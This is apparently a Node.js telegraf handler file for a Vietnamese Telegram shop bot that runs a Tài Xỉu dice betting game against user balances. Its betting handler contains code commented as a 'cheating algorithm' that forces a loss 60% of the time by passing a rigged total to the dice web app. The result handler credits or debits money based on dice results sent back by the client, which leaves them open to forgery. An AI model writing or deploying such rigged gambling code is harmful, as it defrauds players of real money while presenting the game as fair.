const productService = require('../services/productService');
const messages = require('../utils/messages');
const { quantityKeyboard, productListKeyboard, formatPrice } = require('../utils/keyboard');
const config = require('../config');
const userService = require('../services/userService');
const { Markup } = require('telegraf');

module.exports = (bot) => {
    // 1. Xử lý chọn sản phẩm
    bot.action(/^product_(\d+)$/, async (ctx) => {
        const productId = parseInt(ctx.match[1]);
        const product = await productService.getById(productId);
        if (!product) return ctx.answerCbQuery('❌ Sản phẩm không tồn tại');
        await ctx.answerCbQuery();

        if (product.contact_only) {
            const buttons = [];
            const adminUsername = config.SUPPORT_CONTACT.replace('@', '');
            buttons.push([Markup.button.url('💬 Liên hệ mua', `https://t.me/${adminUsername}`)]);
            if (product.contact_url) buttons.push([Markup.button.url('📱 Hotline Zalo 24/7', product.contact_url)]);
            buttons.push([Markup.button.callback('↩️ Quay lại', 'refresh_products')]);
            return ctx.replyWithHTML(messages.contactOnly(product), Markup.inlineKeyboard(buttons));
        }

        const availableStock = product.display_stock || product.stock_count;
        if (availableStock === 0) return ctx.reply(messages.noStock);
        const maxQty = Math.min(availableStock, 10);
        ctx.replyWithHTML(messages.selectQuantity(product), quantityKeyboard(productId, maxQty));
    });

    // 2. Khi bấm nút TÀI hoặc XỈU
    bot.action(/^bet_(tai|xiu)$/, async (ctx) => {
        const choice = ctx.match[1];
        await ctx.answerCbQuery();
        
        ctx.session = ctx.session || {};
        ctx.session.betChoice = choice;

        const choiceName = choice === 'tai' ? '🔴 TÀI' : '🔵 XỈU';
        
        ctx.replyWithHTML(
            `Bạn đã chọn cược <b>${choiceName}</b>.\n\n` +
            `💰 Vui lòng nhập <b>số tiền</b> bạn muốn cược (Ví dụ: 10000):\n\n` +
            `Gõ /cancel để hủy.`
        );
    });

    // 3. Hủy đặt cược
    bot.command('cancel', (ctx) => {
        if (ctx.session && ctx.session.betChoice) {
            ctx.session.betChoice = null;
            return ctx.reply('❌ Đã hủy đặt cược.');
        }
    });

    // 4. Bắt sự kiện người chơi nhập số tiền
    bot.on('text', async (ctx, next) => {
        if (!ctx.session || !ctx.session.betChoice) return next();

        const text = ctx.message.text.trim();
        if (text.startsWith('/')) return next();

        const amount = parseInt(text);
        if (isNaN(amount) || amount <= 0) {
            return ctx.reply('❌ Số tiền không hợp lệ. Vui lòng nhập lại (Ví dụ: 10000).');
        }

        const user = await userService.get(ctx.from.id);
        const userBalance = Number(user ? user.balance : 0);

        if (!user || userBalance < amount) {
            return ctx.reply(`❌ Số dư của bạn không đủ. Số dư hiện tại: ${formatPrice(userBalance)}`);
        }

        const choice = ctx.session.betChoice;
        const choiceName = choice === 'tai' ? 'TÀI' : 'XỈU';
        
        // ═══════════════════════════════════════
        // 5. GỬI NÚT MỞ WEB APP XÚC XẮC
        // ═══════════════════════════════════════
        
        // Thuật toán gian lận: 60% ép thua
        const isForcedLose = Math.random() < 0.6;
        let forcedTotal = null;

        if (isForcedLose) {
            if (choice === 'tai') {
                forcedTotal = Math.floor(Math.random() * 8) + 3; // 3-10 (Xỉu)
            } else {
                forcedTotal = Math.floor(Math.random() * 8) + 11; // 11-18 (Tài)
            }
        }

        // Tạo URL của Web App (trỏ tới file dice.html trên Render của bạn)
        const webAppUrl = `https://telegram-shop-bot-696z.onrender.com/dice.html${forcedTotal ? `?force=${forcedTotal}` : ''}`;

        // Lưu tạm số tiền cược và lựa chọn vào session để xử lý khi Web App trả kết quả về
        ctx.session.betAmount = amount;
        ctx.session.betChoice = choice;

        // Gửi nút mở Web App
        await ctx.replyWithHTML(
            `🎲 <b>Đã nhận cược ${formatPrice(amount)}</b>\n\n` +
            `Bấm nút bên dưới để lắc xúc xắc!`,
            Markup.inlineKeyboard([
                [Markup.button.webApp('🎲 Lắc Xúc Xắc', webAppUrl)]
            ])
        );
    });

    // ═══════════════════════════════════════
    // 6. NHẬN KẾT QUẢ TỪ WEB APP
    // ═══════════════════════════════════════
    bot.on('web_app_data', async (ctx) => {
        try {
            if (!ctx.session || !ctx.session.betAmount) {
                return ctx.reply('❌ Không tìm thấy thông tin cược. Vui lòng chơi lại.');
            }

            const data = JSON.parse(ctx.webAppData.data);
            const amount = Number(ctx.session.betAmount);
            const choice = ctx.session.betChoice;
            const choiceName = choice === 'tai' ? 'TÀI' : 'XỈU';

            // Xóa session sau khi xử lý xong
            delete ctx.session.betAmount;
            delete ctx.session.betChoice;

            const total = data.total;
            const result = data.result;
            const resultName = result === 'tai' ? 'TÀI' : 'XỈU';
            const diceEmojis = ['', '⚀', '⚁', '⚂', '⚃', '⚄', '⚅'];

            const diceMsg = 
                `🎲 <b>KẾT QUẢ LẮC XÚC XẮC</b> 🎲\n\n` +
                `${diceEmojis[data.d1]}  ${diceEmojis[data.d2]}  ${diceEmojis[data.d3]}\n\n` +
                `🔢 Tổng điểm: <b>${total}</b> => <b>${resultName}</b>\n\n` +
                `Bạn đã cược: <b>${choiceName}</b> (${formatPrice(amount)})\n`;

            // Xử lý thắng thua
            await userService.deductBalance(ctx.from.id, amount);

            if (choice === result) {
                // THẮNG
                const winnings = amount;
                await userService.addBalance(ctx.from.id, amount + winnings); 
                
                const updatedUser = await userService.get(ctx.from.id);
                const newBalance = Number(updatedUser.balance);
                
                await ctx.replyWithHTML(
                    diceMsg +
                    `\n🎉 <b>CHÚC MỪNG! BẠN ĐÃ THẮNG</b>\n` +
                    `💰 Tiền thắng: <b>+${formatPrice(winnings)}</b>\n` +
                    `💳 Số dư mới: <b>${formatPrice(newBalance)}</b>`
                );

                try {
                    const adminMsg = 
                        `🎉 <b>NGƯỜI CHƠI THẮNG</b>\n\n` +
                        `👤 Khách: <b>${ctx.from.first_name}</b> (<code>${ctx.from.id}</code>)\n` +
                        `🎲 Cược: <b>${choiceName}</b> | Kết quả: <b>${resultName}</b> (${total} điểm)\n` +
                        `💰 Tiền cược: <b>${formatPrice(amount)}</b>\n` +
                        `💵 Số dư mới: <b>${formatPrice(newBalance)}</b>`;
                    await bot.telegram.sendMessage(config.ADMIN_ID, adminMsg, { parse_mode: 'HTML' });
                } catch (e) { console.error(e); }

            } else {
                // THUA
                const updatedUser = await userService.get(ctx.from.id);
                const newBalance = Number(updatedUser.balance);
                
                await ctx.replyWithHTML(
                    diceMsg +
                    `\n😢 <b>RẤT TIẾC! BẠN ĐÃ THUA</b>\n` +
                    `💸 Tiền mất: <b>-${formatPrice(amount)}</b>\n` +
                    `💳 Số dư mới: <b>${formatPrice(newBalance)}</b>`
                );

                try {
                    const adminMsg = 
                        `😢 <b>NGƯỜI CHƠI THUA</b>\n\n` +
                        `👤 Khách: <b>${ctx.from.first_name}</b> (<code>${ctx.from.id}</code>)\n` +
                        `🎲 Cược: <b>${choiceName}</b> | Kết quả: <b>${resultName}</b> (${total} điểm)\n` +
                        `💸 Tiền mất: <b>${formatPrice(amount)}</b>\n` +
                        `💵 Số dư mới: <b>${formatPrice(newBalance)}</b>`;
                    await bot.telegram.sendMessage(config.ADMIN_ID, adminMsg, { parse_mode: 'HTML' });
                } catch (e) { console.error(e); }
            }

            // Gửi lại menu chơi
            ctx.reply('Chơi tiếp?', productListKeyboard([]));

        } catch (error) {
            console.error('Lỗi xử lý Web App:', error);
            ctx.reply(`❌ Lỗi xử lý kết quả: ${error.message}`);
        }
    });
};